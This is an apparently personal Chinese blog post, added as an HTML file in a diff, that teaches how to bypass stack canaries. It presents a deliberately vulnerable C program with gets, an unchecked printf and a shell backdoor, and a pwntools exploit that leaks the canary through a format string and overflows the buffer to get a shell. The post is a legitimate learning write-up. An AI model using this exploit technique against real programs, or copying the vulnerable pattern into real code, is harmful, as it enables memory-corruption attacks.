@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Pwn(绕过canary保护机制) | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Pwn(绕过canary保护机制)</h2>
+            <div class="post-date">2020-01-03</div>
+            
+            <div class="post-content">
+              <p><strong>canary</strong><br>
+canary保护机制是随机生成一个4字节整数。放在EBP前面。和一个地址里。。</p>
+<!-- more -->
+<p>然后在return前。EBP的值和cannary的值比较。因为溢出势必会覆盖EBP前面才能覆盖EIP<br>
+cannary的值最后两位是\x00，当strcpy等函数识别到\x00，CR,LF,EOF和-1时。。就会停止操作。从而起到一个保护作用<br>
+<strong>绕过</strong><br>
+绕过stack canary一般有两种方式<br>
+1：暴力破解。最后两位00.实际猜测也就4位<br>
+2：字符串格式化。泄露cannary地址<br>
+<strong>实验</strong></p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+#include&lt;stdlib.h&gt;
+
+void canary_protect_me(void){
+	system(&quot;/bin/sh&quot;);
+}
+
+int main(void){
+	setvbuf(stdout,0LL,2,0LL);
+	setvbuf(stdin,0LL,1,0LL);
+	char buf[40];
+	gets(buf);
+	printf(buf);
+	gets(buf);
+	return 0;
+}
+</code></pre>
+<p>上述代码中。定义了40个字节的buf。<br>
+第一个gets输入。我们输入%x，会在后面printf出来<br>
+第二个gets输入。用来溢出<br>
+gdb看下反汇编<br>
+<img src="https://guokeya.github.io/post-images/1578038644979.png" alt="" loading="lazy"><br>
+这个就是canary。ebp-4和gs:0x14的值比较，变化了就说明栈溢出<br>
+继续看下栈内分布<br>
+<img src="https://guokeya.github.io/post-images/1578038569527.png" alt="" loading="lazy"><br>
+格式化字符串。可以看到canary在EBP前面。相对于数组开始地址偏移为11<br>
+数组第一个是地址。指向我们输出的AAAA<br>
+第二个是AAA的值。<br>
+第十二个是canary的值<br>
+利用所学的知识。当我们输入%11<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">输</mi><mi mathvariant="normal">出</mi><mi mathvariant="normal">第</mi><mn>12</mn><mi mathvariant="normal">个</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mo>(</mo><mi>c</mi><mi>a</mi><mi>n</mi><mi>a</mi><mi>r</mi><mi>y</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mo>)</mo><mi mathvariant="normal">栈</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">布</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">地</mi><mi mathvariant="normal">址</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">x时，就会输出第12个的值(canary的值)
+栈分布如下
+地址|%11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">第</span><span class="mord">1</span><span class="mord">2</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mclose">)</span><span class="mord cjk_fallback">栈</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">布</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mord">∣</span></span></span></span>x|data|data|<br>
+第一个get读取到了canary的值。然后我们就将它带入我们的payload。继续溢出到程序中的函数地址。直接getshell<br>
+payload:<br>
+&quot;A&quot;*40+&quot;canary的值&quot;+&quot;EBP&quot;+&quot;system后门地址&quot;<br>
+exp如下:</p>
+<pre><code>from pwn import *
+p=process('./canary')
+p.sendline('%11$x')
+canary=int(p.recv(),16)
+print hex(canary)
+shell_addr=0x0804854b
+payload=&quot;A&quot;*40+p32(canary)+&quot;B&quot;*4+p32(shell_addr)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/Pwn/" class="tag">
+                    Pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/R_m3Wc3Ol/">
+                  <h3 class="post-title">
+                    Pwn(整数溢出漏洞)
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
